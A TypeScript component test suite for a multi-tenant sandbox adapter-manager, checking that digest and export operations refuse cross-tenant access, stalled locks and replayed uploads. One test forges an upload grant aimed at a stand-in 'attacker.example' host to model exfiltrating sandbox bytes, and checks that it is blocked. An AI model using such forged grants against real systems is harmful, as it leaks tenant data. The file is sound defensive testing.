// -----------------------------------------------------------------------------
// DAT-009-3e — digest_artifact / export_artifact over the networked wire, component test.
//
// NetworkedProviderDriver.digestArtifact/exportArtifact -> POST /op/{digest,export}_artifact ->
// the GATED adapter-manager server -> gateOwnedOp -> the real E2bSandboxProvider (key-less mock
// transport; the uploader is injected, so no network PUT). Both are GATED OWNED OPS, exactly like
// `stage_files` (E7-F011): verify capability -> AM-local inspect -> field-wise owned-check ->
// dispatch. Neither op joins the frozen `ProviderOperation` vocabulary.
//
// ★ MULTI-TENANT (F10). The adapter-manager serves every Organization's workers from one process,
// so the owned-op gate is the ONLY thing between one tenant's worker and another tenant's sandbox
// bytes. The cases below refuse a digest AND an export aimed at a sandbox owned by ANOTHER
// ORGANIZATION and by another LEASE of the same Organization, each with the uniform error and a
// provider that is provably never reached — beside a same-tenant positive control that proves the
// route works at all (otherwise every refusal would pass vacuously).
// -----------------------------------------------------------------------------

import type { AddressInfo } from "node:net";
import { createHash, generateKeyPairSync } from "node:crypto";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import type { CreateSandboxSpec, ProviderOpContext, ResourceLabels } from "@armyofagents/worker-daemon";
import { EXPORT_TEARDOWN_RESERVE_MS, ResourceNotAvailableError, UnsupportedProviderOperation } from "@armyofagents/worker-daemon";
import {
  NetworkedProviderDriver,
  OWNED_LABELS_CAPABILITY_AUDIENCE,
  OWNED_LABELS_CAPABILITY_VERSION,
  WireProtocolError,
  signOwnedLabelsCapability,
  type OwnedLabelsCapability,
} from "@armyofagents/provider-wire";
import type { ArtifactUploadGrantV1 } from "@armyofagents/worker-protocol";
import { E2bSandboxProvider } from "@armyofagents/sandbox-e2b-provider/e2b-provider.js";
import { MockE2bTransport } from "@armyofagents/sandbox-e2b-provider/mock-transport.js";

import { createProviderServer } from "../server.js";

const NOW = 1_700_000_000_000;
const UNIFORM_ERR_BODY = JSON.stringify({ err: { name: "ResourceNotAvailableError", message: "resource not available" } });

// Organization A — the caller.
const ORG_A: ResourceLabels = {
  organizationId: "org-a",
  targetId: "tgt-a",
  workerId: "wkr-a",
  jobId: "job-a",
  attempt: 1,
  leaseId: "lease-a",
  deviceGeneration: 7,
};
// Organization B — a DIFFERENT TENANT whose sandbox lives on the same adapter-manager.
const ORG_B: ResourceLabels = {
  organizationId: "org-b",
  targetId: "tgt-b",
  workerId: "wkr-b",
  jobId: "job-b",
  attempt: 1,
  leaseId: "lease-b",
  deviceGeneration: 7,
};
// Same Organization as A, ANOTHER lease (a replaced attempt's successor, say).
const ORG_A_OTHER_LEASE: ResourceLabels = { ...ORG_A, leaseId: "lease-a2", attempt: 2 };

const controlPlane = generateKeyPairSync("ed25519");

const OUT_PATH = "/home/user/out.txt";
const BODY = new TextEncoder().encode("result bytes ✓ é\n");
const BODY_SHA = createHash("sha256").update(BODY).digest("hex");
const STORE_ORIGIN = "https://store.example";
const SIGNATURE = "X-Amz-Signature=deadbeefsecret";
/** A presigned-PUT url that targets `objectKey` on the configured store (path-style bucket). */
function urlFor(objectKey: string, origin: string = STORE_ORIGIN): string {
  return `${origin}/aoa-artifacts/${objectKey}?${SIGNATURE}`;
}

function objectKeyFor(labels: ResourceLabels): string {
  return `organizations/${labels.organizationId}/jobs/${labels.jobId}/attempts/${labels.attempt}/00000000-0000-4000-8000-0000000000b1`;
}

function grant(labels: ResourceLabels, overrides: Partial<ArtifactUploadGrantV1> = {}): ArtifactUploadGrantV1 {
  return {
    protocolVersion: 1,
    operation: "upload",
    artifactId: "00000000-0000-4000-8000-0000000000b1",
    method: "PUT",
    url: urlFor(objectKeyFor(labels)),
    headers: {},
    issuedAt: "2026-09-21T12:00:00.000Z",
    expiresAt: "2126-09-21T12:05:00.000Z",
    maxBytes: BODY.byteLength,
    expectedSha256: BODY_SHA,
    objectKey: objectKeyFor(labels),
    redaction: "secret",
    ...overrides,
  } as ArtifactUploadGrantV1;
}

/** Counts every sandbox read, so "NOT dispatched" means the provider never touched the bytes.
 * With `stallReads` set it never resolves — a hung sandbox read (Codex P1 on f34b65a). */
class RecordingMockTransport extends MockE2bTransport {
  readFileCalls = 0;
  stallReads = false;
  /** How many further `getInfo` calls must hang — the ownership inspection the gate runs UNDER the
   * per-sandbox lock (Codex P1, fourth round). A counter, not a flag, so a later op can succeed and
   * prove the lock was actually released. */
  stallInfoCalls = 0;
  /** ms to DELAY the stalled `getInfo` by instead of hanging forever: it resolves AFTER the budget
   * fired, which is the case where a detached section could still dispatch (Codex P2, PR #557). */
  stallInfoResolveAfterMs: number | null = null;
  override async getInfo(...args: Parameters<MockE2bTransport["getInfo"]>): ReturnType<MockE2bTransport["getInfo"]> {
    if (this.stallInfoCalls > 0) {
      this.stallInfoCalls -= 1;
      const delay = this.stallInfoResolveAfterMs;
      if (delay === null) return new Promise(() => undefined) as ReturnType<MockE2bTransport["getInfo"]>;
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
    return super.getInfo(...args);
  }
  override async readFile(...args: Parameters<MockE2bTransport["readFile"]>): ReturnType<MockE2bTransport["readFile"]> {
    this.readFileCalls += 1;
    if (this.stallReads) return new Promise<Uint8Array>(() => undefined);
    return super.readFile(...args);
  }
}

let transport: RecordingMockTransport;
let uploads: { objectKey: string; bytes: Uint8Array }[];
/** When set, the injected uploader STALLS until its signal aborts (a hung object store). */
let stallUploads = false;
let exportCtxDeadlines: number[];
let digestCtxDeadlines: number[];
let server: ReturnType<typeof createProviderServer>;
let baseUrl: string;

let clockNow = NOW;

async function startServer(
  opts: { gated?: boolean; exportMode?: "grant_upload" | "none"; uploadOrigins?: readonly string[] | null } = {},
): Promise<void> {
  const gated = opts.gated ?? true;
  transport = new RecordingMockTransport();
  uploads = [];
  exportCtxDeadlines = [];
  digestCtxDeadlines = [];
  const performUploadGrant = async (g: ArtifactUploadGrantV1, bytes: Uint8Array, signal?: AbortSignal): Promise<void> => {
    if (stallUploads) {
      await new Promise<void>((_resolve, reject) => {
        if (signal === undefined) return; // an unbounded upload: never settles
        signal.addEventListener("abort", () => reject(new Error("aborted")));
      });
    }
    uploads.push({ objectKey: g.objectKey, bytes: Uint8Array.from(bytes) });
  };
  const base =
    opts.exportMode === "none"
      ? new (class extends E2bSandboxProvider {
          override readonly artifactExportMode = "none" as const;
        })({ transport, performUploadGrant })
      : new E2bSandboxProvider({ transport, performUploadGrant });
  // Records the ctx.deadlineMs the ROUTE hands the provider's exportArtifact.
  const provider = new Proxy(base, {
    get(target, prop) {
      if (prop === "digestArtifact") {
        return (sandboxId: string, path: string, c: ProviderOpContext) => {
          digestCtxDeadlines.push(c.deadlineMs);
          return target.digestArtifact(sandboxId, path, c);
        };
      }
      if (prop === "exportArtifact") {
        return (sandboxId: string, path: string, g: ArtifactUploadGrantV1, c: ProviderOpContext) => {
          exportCtxDeadlines.push(c.deadlineMs);
          return target.exportArtifact(sandboxId, path, g, c);
        };
      }
      const value = Reflect.get(target, prop, target);
      return typeof value === "function" ? value.bind(target) : value;
    },
  });
  const artifactUploadOrigins = opts.uploadOrigins === null ? undefined : (opts.uploadOrigins ?? [STORE_ORIGIN]);
  server = createProviderServer({
    provider,
    controlPlanePublicKey: gated ? controlPlane.publicKey : undefined,
    now: () => clockNow,
    artifactUploadOrigins,
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  baseUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
}
async function stopServer(): Promise<void> {
  await new Promise<void>((resolve, reject) => server.close((err) => (err ? reject(err) : resolve())));
}

beforeEach(() => {
  clockNow = NOW;
  return startServer();
});
afterEach(async () => {
  stallUploads = false;
  await stopServer();
});

function ctx(idempotencyKey: string): ProviderOpContext {
  return { deadlineMs: 5_000, idempotencyKey };
}
function mint(labels: ResourceLabels, expiresAt: number = NOW + 60_000): OwnedLabelsCapability {
  return signOwnedLabelsCapability(
    { v: OWNED_LABELS_CAPABILITY_VERSION, audience: OWNED_LABELS_CAPABILITY_AUDIENCE, ownedLabels: labels, expiresAt },
    controlPlane.privateKey,
  );
}
function driverFor(labels: ResourceLabels | undefined): NetworkedProviderDriver {
  return new NetworkedProviderDriver({ baseUrl, capability: labels === undefined ? undefined : mint(labels) });
}
function specFor(labels: ResourceLabels): CreateSandboxSpec {
  return { resourceLabels: labels, command: "run.sh", args: [], env: {}, workloadType: "coding" };
}
/** A live sandbox owned by `labels` whose filesystem already holds OUT_PATH = BODY. */
async function sandboxWithOutput(labels: ResourceLabels): Promise<string> {
  const r = await driverFor(labels).create(specFor(labels), ctx(`c-${labels.organizationId}-${labels.leaseId}`));
  await transport.writeFiles(r.sandboxId, [{ path: OUT_PATH, bytes: BODY }]);
  return r.sandboxId;
}
async function rawOp(op: string, body: unknown): Promise<string> {
  const res = await fetch(`${baseUrl}/op/${op}`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
  return res.text();
}

describe("DAT-009-3e — digest/export over the networked wire (gated owned ops)", () => {
  it("SAME-TENANT POSITIVE CONTROL: Organization A digests + exports its OWN sandbox's output", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const driver = driverFor(ORG_A);

    const digest = await driver.digestArtifact(sandboxId, OUT_PATH, ctx("d-own"));
    expect(digest).toEqual({ sha256: BODY_SHA, sizeBytes: BODY.byteLength });

    const exported = await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-own"));
    // Reference out, never bytes.
    expect(exported).toEqual({ objectKey: objectKeyFor(ORG_A) });
    // The far provider really uploaded the sandbox's bytes under A's own key.
    expect(uploads).toHaveLength(1);
    expect(uploads[0]!.objectKey).toBe(objectKeyFor(ORG_A));
    expect(uploads[0]!.bytes).toEqual(BODY);
  });

  it("★ F10 CROSS-ORGANIZATION: A's capability cannot DIGEST B's sandbox — uniform refusal, B's bytes never read", async () => {
    const bSandbox = await sandboxWithOutput(ORG_B);
    const reads = transport.readFileCalls;
    await expect(driverFor(ORG_A).digestArtifact(bSandbox, OUT_PATH, ctx("d-cross-org"))).rejects.toBeInstanceOf(
      ResourceNotAvailableError,
    );
    expect(transport.readFileCalls).toBe(reads);
  });

  it("★ F10 CROSS-ORGANIZATION: A's capability cannot EXPORT B's sandbox — uniform refusal, nothing uploaded", async () => {
    const bSandbox = await sandboxWithOutput(ORG_B);
    const reads = transport.readFileCalls;
    // Even with a grant that names B's own key: the gate decides on the CAPABILITY, not the grant.
    await expect(driverFor(ORG_A).exportArtifact(bSandbox, OUT_PATH, grant(ORG_B), ctx("e-cross-org"))).rejects.toBeInstanceOf(
      ResourceNotAvailableError,
    );
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  it("★ another LEASE of the same Organization is refused too (a replaced attempt cannot read its successor's sandbox)", async () => {
    const successor = await sandboxWithOutput(ORG_A_OTHER_LEASE);
    const reads = transport.readFileCalls;
    await expect(driverFor(ORG_A).digestArtifact(successor, OUT_PATH, ctx("d-other-lease"))).rejects.toBeInstanceOf(
      ResourceNotAvailableError,
    );
    await expect(
      driverFor(ORG_A).exportArtifact(successor, OUT_PATH, grant(ORG_A), ctx("e-other-lease")),
    ).rejects.toBeInstanceOf(ResourceNotAvailableError);
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  it("MISSING capability: both refused, nothing read or uploaded (never trusted on absence)", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const reads = transport.readFileCalls;
    await expect(driverFor(undefined).digestArtifact(sandboxId, OUT_PATH, ctx("d-nocap"))).rejects.toBeInstanceOf(
      ResourceNotAvailableError,
    );
    await expect(driverFor(undefined).exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-nocap"))).rejects.toBeInstanceOf(
      ResourceNotAvailableError,
    );
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  it("the cross-Organization refusal is BYTE-IDENTICAL to not-found (no cross-tenant existence oracle)", async () => {
    const bSandbox = await sandboxWithOutput(ORG_B);
    const cap = mint(ORG_A);
    for (const op of ["digest_artifact", "export_artifact"] as const) {
      const args = (sandboxId: string) =>
        op === "digest_artifact" ? { sandboxId, path: OUT_PATH } : { sandboxId, path: OUT_PATH, grant: grant(ORG_A) };
      const foreignBody = await rawOp(op, { args: args(bSandbox), ctx: ctx("raw-f"), capability: cap });
      const notFoundBody = await rawOp(op, { args: args("sbx-nope"), ctx: ctx("raw-n"), capability: cap });
      expect(foreignBody).toBe(UNIFORM_ERR_BODY);
      expect(notFoundBody).toBe(UNIFORM_ERR_BODY);
    }
  });

  it("GATED-ONLY: an UNGATED (keyless) server 404s both ops — never a raw read or a raw upload", async () => {
    await stopServer();
    await startServer({ gated: false });
    for (const op of ["digest_artifact", "export_artifact"]) {
      const body = await rawOp(op, { args: { sandboxId: "sbx-anything", path: OUT_PATH, grant: grant(ORG_A) }, ctx: ctx(`u-${op}`) });
      expect(body).toContain("WireProtocolError");
      expect(body).toContain(`operation not available in this slice: ${op}`);
    }
    expect(transport.readFileCalls).toBe(0);
    expect(uploads).toHaveLength(0);
  });

  it("★ a file that CHANGED after its digest is refused AT THE CAUSE (far side), nothing uploaded, no url/path/digest on the wire", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    // The sandbox rewrites the file after the grant was minted from the earlier digest.
    await transport.writeFiles(sandboxId, [{ path: OUT_PATH, bytes: new TextEncoder().encode("tampered") }]);
    const body = await rawOp("export_artifact", {
      args: { sandboxId, path: OUT_PATH, grant: grant(ORG_A) },
      ctx: ctx("e-toctou"),
      capability: mint(ORG_A),
    });
    expect(body).toContain("WireProtocolError");
    expect(uploads).toHaveLength(0);
    // The AM leak fence replaces the provider's own message (which names the path and the digests).
    expect(body).not.toContain(OUT_PATH);
    expect(body).not.toContain(BODY_SHA);
    expect(body).not.toContain("deadbeefsecret");
    // And through the driver it is a failure, never a fabricated reference.
    await expect(driverFor(ORG_A).exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-toctou-2"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
  });

  // ★ Codex P1 on PR #557: the grant is WORKER-SUPPLIED. A worker holding a valid capability for its
  // own sandbox could otherwise hand the adapter-manager a forged grant and have the far provider
  // PUT the sandbox's bytes to any HTTPS endpoint: an egress channel around the sandbox's own
  // network policy, run by the adapter-manager. The route binds the grant BEFORE the provider runs.
  it("★ a forged grant whose url points at ANOTHER origin is refused — nothing read, nothing uploaded", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const reads = transport.readFileCalls;
    const forged = grant(ORG_A, { url: urlFor(objectKeyFor(ORG_A), "https://attacker.example") });
    const body = await rawOp("export_artifact", { args: { sandboxId, path: OUT_PATH, grant: forged }, ctx: ctx("e-forged"), capability: mint(ORG_A) });
    expect(body).toContain("WireProtocolError");
    expect(body).not.toContain("attacker.example");
    expect(body).not.toContain("deadbeefsecret");
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  it("★ F10: a grant for ANOTHER ORGANIZATION's object key is refused on the caller's own sandbox", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const reads = transport.readFileCalls;
    // A's capability, A's sandbox, but a grant (correct store origin) writing under B's prefix.
    await expect(driverFor(ORG_A).exportArtifact(sandboxId, OUT_PATH, grant(ORG_B), ctx("e-foreign-key"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  it("★ a grant for another ATTEMPT of the same job is refused (the key is bound to the capability's attempt)", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    await expect(
      driverFor(ORG_A).exportArtifact(sandboxId, OUT_PATH, grant(ORG_A_OTHER_LEASE), ctx("e-other-attempt")),
    ).rejects.toBeInstanceOf(WireProtocolError);
    expect(uploads).toHaveLength(0);
  });

  it("★ a grant whose url does not target its own objectKey is refused", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const mismatched = grant(ORG_A, { url: urlFor("organizations/org-a/jobs/job-a/attempts/1/some-other-object") });
    await expect(driverFor(ORG_A).exportArtifact(sandboxId, OUT_PATH, mismatched, ctx("e-url-key"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
    expect(uploads).toHaveLength(0);
  });

  it("★ FAIL-CLOSED: a server with NO configured upload origin refuses every export (digest still works)", async () => {
    await stopServer();
    await startServer({ uploadOrigins: null });
    const sandboxId = await sandboxWithOutput(ORG_A);
    expect(await driverFor(ORG_A).digestArtifact(sandboxId, OUT_PATH, ctx("d-noorigin"))).toEqual({
      sha256: BODY_SHA,
      sizeBytes: BODY.byteLength,
    });
    const reads = transport.readFileCalls;
    await expect(driverFor(ORG_A).exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-noorigin"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  // ★ Codex P1 on PR #557: `gateOwnedOp` holds the per-sandbox lock across dispatch, so an
  // unbounded PUT would queue the run's own destroy behind it. The route bounds the export to the
  // capability's life minus EXPORT_TEARDOWN_RESERVE_MS (the supervisor's own window clamp), and
  // the provider aborts the upload at that budget.
  it("★ the export budget is clamped to capability expiry minus the teardown reserve", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const driver = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + 60_000) });
    await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), { deadlineMs: 600_000, idempotencyKey: "e-clamp" });
    expect(exportCtxDeadlines).toEqual([60_000 - EXPORT_TEARDOWN_RESERVE_MS]);
    // A tighter caller budget is kept. (A second object key: a redemption is one-time per key.)
    const secondKey = `${objectKeyFor(ORG_A)}-clamp2`;
    await driver.exportArtifact(
      sandboxId,
      OUT_PATH,
      grant(ORG_A, { objectKey: secondKey, url: urlFor(secondKey) }),
      { deadlineMs: 5_000, idempotencyKey: "e-clamp-2" },
    );
    expect(exportCtxDeadlines[1]).toBe(5_000);
  });

  it("★ inside the teardown reserve the export is refused WITHOUT dispatch", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const reads = transport.readFileCalls;
    const driver = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS) });
    await expect(driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-reserve"))).rejects.toBeInstanceOf(WireProtocolError);
    // The ROUTE refused: the provider was never called (not merely called with a dead budget).
    expect(exportCtxDeadlines).toHaveLength(0);
    expect(transport.readFileCalls).toBe(reads);
    expect(uploads).toHaveLength(0);
  });

  it("★ a STALLED upload releases the sandbox lock at its budget, so the run's destroy is not stranded", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    stallUploads = true;
    // 200 ms of budget left before the teardown reserve.
    const cap = mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS + 200);
    const driver = new NetworkedProviderDriver({ baseUrl, capability: cap });
    const exporting = driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), { deadlineMs: 600_000, idempotencyKey: "e-stall" });
    const destroyed = driver.destroy(sandboxId, ctx("destroy-after-stall"));
    await expect(exporting).rejects.toBeInstanceOf(WireProtocolError);
    const result = await Promise.race([
      destroyed,
      new Promise<"stranded">((resolve) => setTimeout(() => resolve("stranded"), 5_000)),
    ]);
    expect(result).not.toBe("stranded");
    expect(uploads).toHaveLength(0);
  });

  it("★ a STALLED sandbox READ also releases the lock at its budget, so destroy is not stranded", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    transport.stallReads = true;
    const cap = mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS + 200);
    const driver = new NetworkedProviderDriver({ baseUrl, capability: cap });
    const exporting = driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), { deadlineMs: 600_000, idempotencyKey: "e-read-stall" });
    const destroyed = driver.destroy(sandboxId, ctx("destroy-after-read-stall"));
    await expect(exporting).rejects.toBeInstanceOf(WireProtocolError);
    const result = await Promise.race([
      destroyed,
      new Promise<"stranded">((resolve) => setTimeout(() => resolve("stranded"), 5_000)),
    ]);
    expect(result).not.toBe("stranded");
    expect(uploads).toHaveLength(0);
  });

  it("★ digest carries the CLAMPED budget to the provider, and is refused inside the reserve", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    // A generous caller budget is clamped to the capability's life minus the reserve...
    const wide = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + 60_000) });
    await wide.digestArtifact(sandboxId, OUT_PATH, { deadlineMs: 600_000, idempotencyKey: "d-clamp" });
    expect(digestCtxDeadlines).toEqual([60_000 - EXPORT_TEARDOWN_RESERVE_MS]);

    // ...and inside the reserve the ROUTE refuses: the provider is never called at all.
    const reads = transport.readFileCalls;
    const tight = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS) });
    await expect(tight.digestArtifact(sandboxId, OUT_PATH, ctx("d-reserve"))).rejects.toBeInstanceOf(WireProtocolError);
    expect(digestCtxDeadlines).toHaveLength(1);
    expect(transport.readFileCalls).toBe(reads);
  });

  // ★ Codex P1 (third round, PR #557): the grant's INTEGRITY fields are worker-supplied and no
  // control-plane signature covers them, so a worker that keeps a redeemed presigned url could
  // re-PUT different bytes under the SAME object key — after the fenced commit already verified
  // the first ones — by handing in a grant with a different expectedSha256. The route makes a
  // successful redemption ONE-TIME per object key, so the replay never reaches the provider.
  it("★ a SECOND successful export of the same objectKey is refused — the re-PUT never reaches the provider", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const driver = driverFor(ORG_A);
    await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-once-1"));
    expect(uploads).toHaveLength(1);

    // The replay: the same accepted url/objectKey, different integrity fields and different bytes.
    const tampered = new TextEncoder().encode("second bytes");
    await transport.writeFiles(sandboxId, [{ path: OUT_PATH, bytes: tampered }]);
    const replay = grant(ORG_A, {
      expectedSha256: createHash("sha256").update(tampered).digest("hex"),
      maxBytes: tampered.byteLength,
    });
    const before = exportCtxDeadlines.length;
    await expect(driver.exportArtifact(sandboxId, OUT_PATH, replay, ctx("e-once-2"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
    expect(exportCtxDeadlines).toHaveLength(before); // the provider was never called
    expect(uploads).toHaveLength(1); // and the stored object still has only the first bytes
    expect(uploads[0]!.bytes).toEqual(BODY);
  });

  it("★ positive control: a retry after a FAILED export is still allowed, and a DIFFERENT key always is", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const driver = driverFor(ORG_A);
    // A failed export (the file no longer matches the grant) records no redemption...
    await transport.writeFiles(sandboxId, [{ path: OUT_PATH, bytes: new TextEncoder().encode("mismatched") }]);
    await expect(driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-fail"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
    // ...so the same key can still be exported once the sandbox holds the granted bytes.
    await transport.writeFiles(sandboxId, [{ path: OUT_PATH, bytes: BODY }]);
    await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-retry"));
    expect(uploads).toHaveLength(1);

    // A different object key (a different artifact of the same attempt) is unaffected.
    const otherKey = `${objectKeyFor(ORG_A)}-2`;
    await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A, { objectKey: otherKey, url: urlFor(otherKey) }), ctx("e-other"));
    expect(uploads.map((u) => u.objectKey)).toEqual([objectKeyFor(ORG_A), otherKey]);
  });

  // ★ Codex P1 (fourth round): the OWNERSHIP INSPECTION runs inside `gateOwnedOp`'s per-sandbox
  // mutex and the provider ignores `ctx.deadlineMs`, so a hung `getInfo` held the lock however long
  // the transport hung — the strand again, one step earlier than the read and the upload.
  it("★ a STALLED ownership inspection releases the lock at the op budget, so the next op is not stranded", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    transport.stallInfoCalls = 1; // only the export's own inspect hangs
    const cap = mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS + 200);
    const driver = new NetworkedProviderDriver({ baseUrl, capability: cap });
    const exporting = driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), { deadlineMs: 600_000, idempotencyKey: "e-inspect-stall" });
    const destroyed = driver.destroy(sandboxId, ctx("destroy-after-inspect-stall"));
    await expect(exporting).rejects.toBeInstanceOf(WireProtocolError);
    const result = await Promise.race([
      destroyed,
      new Promise<"stranded">((resolve) => setTimeout(() => resolve("stranded"), 5_000)),
    ]);
    expect(result).not.toBe("stranded");
    expect(uploads).toHaveLength(0);
  });

  it("★ a stalled inspection on DIGEST is bounded the same way", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    transport.stallInfoCalls = 1;
    const driver = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS + 200) });
    await expect(
      driver.digestArtifact(sandboxId, OUT_PATH, { deadlineMs: 600_000, idempotencyKey: "d-inspect-stall" }),
    ).rejects.toBeInstanceOf(WireProtocolError);
    // The lock is free: the same sandbox answers the next request.
    expect(await driver.digestArtifact(sandboxId, OUT_PATH, ctx("d-after-stall"))).toEqual({
      sha256: BODY_SHA,
      sizeBytes: BODY.byteLength,
    });
  });

  // ★ Codex P2 (fourth round): `ProviderOpContext`'s contract is "a repeated key returns the
  // recorded result and does not double-apply". A lost response must not turn into a missing output.
  it("★ a REPLAY with the same idempotency key returns the recorded result; a DIFFERENT key is refused", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    const driver = driverFor(ORG_A);
    const first = await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-replay"));
    expect(uploads).toHaveLength(1);

    // The lost-response replay: same key, same grant. Recorded result, and NO second upload.
    const replayed = await driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-replay"));
    expect(replayed).toEqual(first);
    expect(uploads).toHaveLength(1);

    // A re-PUT under a NEW idempotency key is still refused, tampered fields or not.
    await expect(driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-replay-other"))).rejects.toBeInstanceOf(
      WireProtocolError,
    );
    expect(uploads).toHaveLength(1);
  });

  // ★ Codex P2 (fifth round): when the budget fires, the LOCKED section is detached. If its
  // inspection later resolves, it must NOT go on to dispatch — a late export would start reading
  // and PUTting after teardown already took the lock, which is the reserve defeated from behind.
  it("★ a detached locked section does NOT dispatch after its budget fired", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    transport.stallInfoCalls = 1;
    transport.stallInfoResolveAfterMs = 400; // resolves well after the 200 ms budget
    const driver = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + EXPORT_TEARDOWN_RESERVE_MS + 200) });
    await expect(
      driver.exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), { deadlineMs: 600_000, idempotencyKey: "e-detached" }),
    ).rejects.toBeInstanceOf(WireProtocolError);
    const readsAtTimeout = transport.readFileCalls;
    // Give the abandoned inspection time to resolve and (wrongly) continue.
    await new Promise((resolve) => setTimeout(resolve, 1_000));
    expect(transport.readFileCalls).toBe(readsAtTimeout);
    expect(uploads).toHaveLength(0);
  });

  it("★ an EXPIRED upload grant is refused, and its redemption record is evicted rather than kept forever", async () => {
    const sandboxId = await sandboxWithOutput(ORG_A);
    // A long-lived capability, so the GRANT's expiry is the only thing that lapses here.
    const driver = new NetworkedProviderDriver({ baseUrl, capability: mint(ORG_A, NOW + 600_000) });
    const short = grant(ORG_A, { expiresAt: new Date(NOW + 60_000).toISOString() });
    await driver.exportArtifact(sandboxId, OUT_PATH, short, ctx("e-ttl-1"));
    expect(uploads).toHaveLength(1);

    // Past the grant's expiry: a replay of the SAME grant is refused because the grant is dead...
    clockNow = NOW + 120_000;
    await expect(driver.exportArtifact(sandboxId, OUT_PATH, short, ctx("e-ttl-1"))).rejects.toBeInstanceOf(WireProtocolError);
    expect(uploads).toHaveLength(1);

    // ...and the expired record no longer occupies the ledger: a FRESH grant for the same key is
    // dispatched again rather than refused as a re-PUT of the evicted record.
    const fresh = grant(ORG_A, { expiresAt: new Date(clockNow + 60_000).toISOString() });
    await driver.exportArtifact(sandboxId, OUT_PATH, fresh, ctx("e-ttl-2"));
    expect(uploads).toHaveLength(2);
  });

  it("a FAR provider that declares artifactExportMode='none' declines honestly, as its own class", async () => {
    await stopServer();
    await startServer({ exportMode: "none" });
    const sandboxId = await sandboxWithOutput(ORG_A);
    await expect(driverFor(ORG_A).digestArtifact(sandboxId, OUT_PATH, ctx("d-none"))).rejects.toBeInstanceOf(
      UnsupportedProviderOperation,
    );
    await expect(driverFor(ORG_A).exportArtifact(sandboxId, OUT_PATH, grant(ORG_A), ctx("e-none"))).rejects.toMatchObject({
      name: "UnsupportedProviderOperation",
      operation: "export_artifact",
    });
    expect(uploads).toHaveLength(0);
  });
});
